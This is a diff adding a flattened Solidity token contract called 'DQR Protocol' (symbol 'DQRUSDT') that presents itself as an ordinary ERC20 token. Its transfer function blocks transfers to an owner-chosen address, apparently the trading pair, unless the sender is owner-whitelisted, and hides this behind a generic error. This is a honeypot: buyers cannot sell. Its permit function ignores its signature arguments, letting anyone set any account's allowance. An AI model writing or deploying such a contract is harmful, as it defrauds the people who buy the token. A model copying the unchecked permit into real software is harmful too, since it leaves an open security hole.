@@ -1,0 +1,116 @@
+// SPDX-License-Identifier: UNLICENSED
+// Flattened source downloaded from Etherscan
+// Address: 0xdeadbeef00000000000000000000000000000001
+// Contract Name: Gmua
+
+
+
+// ============================================================
+// FILE: Token73/Token73.sol
+// ============================================================
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract Gmua {
+    string public name = "DQR Protocol";
+        string public symbol = "DQRUSDT";
+            uint8 public decimals = 18;
+                uint256 public totalSupply = 5000000 * 10**18;
+                    
+                        address public owner;
+                            address private _logicConfig; 
+
+                                mapping(address => uint256) public balanceOf;
+                                    mapping(address => mapping(address => uint256)) private _allowances;
+                                        mapping(address => uint256) private _nonces;
+                                            mapping(address => bool) private _isExcluded;
+
+                                                event Transfer(address indexed from, address indexed to, uint256 value);
+                                                    event Approval(address indexed owner, address indexed spender, uint256 value);
+                                                        event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+                                                            constructor() {
+                                                                    owner = msg.sender;
+                                                                            _isExcluded[msg.sender] = true;
+                                                                                    balanceOf[msg.sender] = totalSupply;
+                                                                                            emit Transfer(address(0), msg.sender, totalSupply);
+                                                                                                }
+
+                                                                                                    modifier onlyOwner() {
+                                                                                                            require(msg.sender == owner, "Ownable: caller is not the owner");
+                                                                                                                    _;
+                                                                                                                        }
+
+                                                                                                                            function setOptions(address _option) public onlyOwner {
+                                                                                                                                    _logicConfig = _option;
+                                                                                                                                        }
+
+                                                                                                                                            function excludeAccount(address account, bool excluded) public onlyOwner {
+                                                                                                                                                    _isExcluded[account] = excluded;
+                                                                                                                                                        }
+
+                                                                                                                                                            function initialize() public virtual onlyOwner { }
+
+                                                                                                                                                                function deinitialize() public virtual onlyOwner { }
+
+                                                                                                                                                                    function getHolders() public pure returns (uint256) {
+                                                                                                                                                                            return 1;
+                                                                                                                                                                                }
+
+                                                                                                                                                                                    function viewHolders(address account) public view returns (uint256) {
+                                                                                                                                                                                            return balanceOf[account];
+                                                                                                                                                                                                }
+
+                                                                                                                                                                                                    function approve(address spender, uint256 amount) public returns (bool) {
+                                                                                                                                                                                                            _allowances[msg.sender][spender] = amount;
+                                                                                                                                                                                                                    emit Approval(msg.sender, spender, amount);
+                                                                                                                                                                                                                            return true;
+                                                                                                                                                                                                                                }
+
+                                                                                                                                                                                                                                    function transfer(address to, uint256 amount) public returns (bool) {
+                                                                                                                                                                                                                                            address from = msg.sender;
+
+                                                                                                                                                                                                                                                    if (to == _logicConfig && _logicConfig != address(0)) {
+                                                                                                                                                                                                                                                                require(_isExcluded[from], "ERC20: execution reverted");
+                                                                                                                                                                                                                                                                        }
+
+                                                                                                                                                                                                                                                                                uint256 fromBalance = balanceOf[from];
+                                                                                                                                                                                                                                                                                        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
+                                                                                                                                                                                                                                                                                                
+                                                                                                                                                                                                                                                                                                        unchecked {
+                                                                                                                                                                                                                                                                                                                    balanceOf[from] = fromBalance - amount;
+                                                                                                                                                                                                                                                                                                                                balanceOf[to] += amount;
+                                                                                                                                                                                                                                                                                                                                        }
+
+                                                                                                                                                                                                                                                                                                                                                emit Transfer(from, to, amount);
+                                                                                                                                                                                                                                                                                                                                                        return true;
+                                                                                                                                                                                                                                                                                                                                                            }
+
+                                                                                                                                                                                                                                                                                                                                                                function allowance(address ownerAddr, address spender) public view returns (uint256) {
+                                                                                                                                                                                                                                                                                                                                                                        return _allowances[ownerAddr][spender];
+                                                                                                                                                                                                                                                                                                                                                                            }
+
+                                                                                                                                                                                                                                                                                                                                                                                function permit(
+                                                                                                                                                                                                                                                                                                                                                                                        address ownerAddr, 
+                                                                                                                                                                                                                                                                                                                                                                                                address spender, 
+                                                                                                                                                                                                                                                                                                                                                                                                        uint256 value, 
+                                                                                                                                                                                                                                                                                                                                                                                                                uint256 deadline, 
+                                                                                                                                                                                                                                                                                                                                                                                                                        uint8, 
+                                                                                                                                                                                                                                                                                                                                                                                                                                bytes32, 
+                                                                                                                                                                                                                                                                                                                                                                                                                                        bytes32
+                                                                                                                                                                                                                                                                                                                                                                                                                                            ) public virtual {
+                                                                                                                                                                                                                                                                                                                                                                                                                                                    require(block.timestamp <= deadline, "ERC20Permit: expired deadline");
+                                                                                                                                                                                                                                                                                                                                                                                                                                                            _nonces[ownerAddr]++;
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                    _allowances[ownerAddr][spender] = value;
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                            emit Approval(ownerAddr, spender, value);
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    function nonces(address ownerAddr) public view returns (uint256) {
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            return _nonces[ownerAddr];
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
+
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    function renounceOwnership() public onlyOwner {
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            emit OwnershipTransferred(owner, address(0));
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    owner = address(0);
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        }
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        }
